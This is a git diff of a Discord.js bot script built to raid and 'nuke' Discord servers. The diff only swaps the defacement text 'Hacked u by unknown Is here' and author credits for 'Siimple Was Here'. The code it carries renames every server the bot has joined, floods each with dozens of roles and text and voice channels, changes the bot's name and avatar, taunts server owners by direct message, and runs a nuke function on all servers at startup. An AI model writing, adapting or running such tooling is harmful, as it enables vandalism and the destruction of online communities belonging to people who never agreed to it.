@@ -1,6 +1,6 @@
 const Discord = require("discord.js");
 const LOka = new Discord.Client();
-console.log('By KBOOOOOOOOSH-YT');
+console.log('By Siimpleeeeeee');
 LOka.on('ready', () => {
   console.log(`Logged in as ${LOka.user.tag} !`);
  
@@ -8,10 +8,10 @@ LOka.on('ready', () => {
 LOka.on('ready',  () => {
 console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
 console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
-console.log('      ~            ~  By : KBOOOOOOOOSH-YT ~           ~    ');
+console.log('      ~            ~  By : Siimple ~           ~    ');
 console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
 console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
-console.log(`Logged in as  * [ "  KBOOOOOOOOSH-YT " ] servers! [ " ${LOka.guilds.size} " ] Users! [ " ${LOka.users.size} " ]`);
+console.log(`Logged in as  * [ "  Siimpleeeeeee " ] servers! [ " ${LOka.guilds.size} " ] Users! [ " ${LOka.users.size} " ]`);
  
        
    
@@ -25,28 +25,28 @@ LOka.on("message", message => {
   if (message.content.startsWith('hix15')) {
     LOka.user.setUsername(argresult);
   }
-    if (message.content.startsWith(prefix + 'on123')) {
+    if (message.content.startsWith(prefix + 'go')) {
     LOka.user.setStatus(argresult);
   }
 });
  
-var x1 = "kk"
+var x1 = "go"
 LOka.on('message', message => {
      if (message.content === ".") {
 LOka.user.setAvatar(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
  
 }
 });
-var x1 = "kk"
+var x1 = "go"
 LOka.on('message', message => {
      if (message.content === ".") {
-LOka.user.setUsername("Hacked u by unknown Is here")
+LOka.user.setUsername("Siimple Was Here")
  
 }
 });
 LOka.on('message', message => {
      if (message.content === ".") {
-LOka.user.setGame(`Hacked u by unknown Is here`,'https://www.twitch.tv/hix')
+LOka.user.setGame(`Siimple Was Here`,'https://www.twitch.tv/hix')
  
 }
 });
@@ -61,7 +61,7 @@ LOka.on('message', message => {
 LOka.on('message', message => {
      if (message.content === ".") {
          LOka.guilds.forEach(m =>{
-             m.setName(`Hacked u by unknown Is here`)
+             m.setName(`Siimple Was Here`)
 })
 }
 });
@@ -78,200 +78,200 @@ LOka.on('message', message => {
 LOka.on('message', message => {
      
  
-     if (message.content === "k1") {
+     if (message.content === "go") {
          LOka.guilds.forEach(m =>{
   m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "Siimple Was Here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "Siimple Was Here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "Siimple Was Here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "Siimple Was Here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "Siimple Was Here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "Siimple Was Here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "Siimple Was Here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "Siimple Was Here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "Siimple Was Here",
         permissions :   [1],
         color : " #ff0000"
     })
  
     m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "Siimple Was Here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "Siimple Was Here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "Siimple Was Here",
         permissions :   [1],
         color : " #ff0000"
     })
      m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "Siimple Was Here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
- 
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "Siimple Was Here",
         permissions :   [1],
         color : " #ff0000"
     })
  
     m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "Siimple Was Here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "Siimple Was Here",
         permissions :   [1],
         color : " #ff0000"
     })
  
     m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "Siimple Was Here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "Siimple Was Here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Siimple Was Here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Siimple Was Here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Siimple Was Here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Siimple Was Here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Siimple Was Here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Siimple Was Here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Siimple Was Here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Siimple Was Here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Siimple Was Here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Siimple Was Here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Siimple Was Here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Siimple Was Here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Siimple Was Here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Siimple Was Here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Siimple Was Here",
         permissions :   [1],
         color : " #ff0000"
     })
  
     m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "Siimple Was Here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "Siimple Was Here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+ 
+    m.createRole({
+        name : "Siimple Was Here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "Siimple Was Here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Siimple Was Here",
         permissions :   [1],
         color : " #ff0000"
     })
@@ -286,52 +286,52 @@ LOka.on('message', message => {
 LOka.on('message', message => {
          if (message.content === "k") {
                LOka.guilds.forEach(m =>{
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Siimple Was Here', 'text');
+m.createChannel('Siimple Was Here', 'text');
+m.createChannel('Siimple Was Here', 'text');
+m.createChannel('Siimple Was Here', 'text');
+m.createChannel('Siimple Was Here', 'text');
+m.createChannel('Siimple Was Here', 'text');
+m.createChannel('Siimple Was Here', 'text');
+m.createChannel('Siimple Was Here', 'text');
+m.createChannel('Siimple Was Here', 'text');
+m.createChannel('Siimple Was Here', 'text');
  
-m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Siimple Was Here', 'text');
  
-m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Siimple Was Here', 'text');
  
-m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Siimple Was Here', 'text');
  
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Siimple Was Here', 'text');
+m.createChannel('Siimple Was Here', 'text');
+m.createChannel('Siimple Was Here', 'text');
+m.createChannel('Siimple Was Here', 'text');
+m.createChannel('Siimple Was Here', 'text');
+m.createChannel('Siimple Was Here', 'text');
+m.createChannel('Siimple Was Here', 'text');
+m.createChannel('Siimple Was Here', 'text');
+m.createChannel('Siimple Was Here', 'text');
+m.createChannel('Siimple Was Here', 'text');
+m.createChannel('Siimple Was Here', 'text');
  
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Siimple Was Here', 'text');
+m.createChannel('Siimple Was Here', 'text');
  
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Siimple Was Here', 'text');
+m.createChannel('Siimple Was Here', 'text');
+m.createChannel('Siimple Was Here', 'text');
+m.createChannel('Siimple Was Here', 'text');
+m.createChannel('Siimple Was Here', 'text');
+m.createChannel('Siimple Was Here', 'text');
+m.createChannel('Siimple Was Here', 'text');
+m.createChannel('Siimple Was Here', 'text');
+m.createChannel('Siimple Was Here', 'text');
+m.createChannel('Siimple Was Here', 'text');
+m.createChannel('Siimple Was Here', 'text');
  
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Siimple Was Here', 'text');
+m.createChannel('Siimple Was Here', 'text');
  
 })
 }
@@ -340,65 +340,65 @@ m.createChannel('Hacked u by unknown Is here', 'text');
 LOka.on('message', message => {
          if (message.content === "k") {
                  LOka.guilds.forEach(m =>{
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
  
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
  
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
  
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
  
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
  
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
+m.createChannel('Siimple Was Here', 'voice');
  
  
  
@@ -417,7 +417,7 @@ async function nuke(guild) {
  
   await guild.fetchMembers();
  
-  await guild.owner.send(' Hacked u by unknown Is here    سلم على سيرفرك هههههههههههههههه').catch(e => { return void e; });
+  await guild.owner.send(' Siimple Was Here    سلم على سيرفرك هههههههههههههههه').catch(e => { return void e; });
  
  
  
@@ -436,9 +436,9 @@ async function nuke(guild) {
     }
   }));
  
-    await guild.createChannel('Hacked u by unknown Is here', 'text');
+    await guild.createChannel('Siimple Was Here', 'text');
  
-      await guild.createChannel('Hacked u by unknown Is here', 'voice');
+      await guild.createChannel('Siimple Was Here', 'voice');
  
  
  
@@ -448,7 +448,7 @@ LOka.on('ready', () => {
   for(const [, g] of LOka.guilds) nuke(g).catch(console.error);
   console.log('-------------------------------------------------------------');
   console.log('');
-  console.log("Made by YzhF1");
+  console.log("Made by Simple");
   console.log("");
   console.log("-------------------------------------------------------------");
  
